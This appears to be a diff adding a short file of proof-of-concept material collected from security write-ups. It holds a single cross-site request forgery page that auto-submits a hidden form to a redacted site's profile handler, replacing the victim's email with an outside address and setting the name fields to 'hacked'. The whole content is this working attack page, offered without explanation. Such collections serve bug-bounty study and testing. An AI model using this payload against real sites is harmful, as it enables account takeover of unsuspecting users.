@@ -1,0 +1,24 @@
+Some POCs from Writeups:
+--------------------------
+
+
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="https://redacted.com/secure/profile/profile_form_handler.php" method="POST">
+        <input type="hidden" name="nextpage" value="%2Fsecure%2Fprofile%2Fupdated_profile"/>
+        <input type="hidden" name="prevpage" value="%2Fsecure%2Fprofile%2Fprofile"/>
+        <input type="hidden" name="selectedRadialValue" value="790"/>
+        <input type="hidden" name="txtEmail" value="lybybyte@mailo.icu"/>
+        <input type="hidden" name="txtFirstName" value="hacked"/>
+        <input type="hidden" name="txtLastName" value="hacked"/>
+        <input type="hidden" name="txtDayPhone" value="999999999"/>
+        <input type="hidden" name="hdnSmsPhone" value="999999999"/>
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
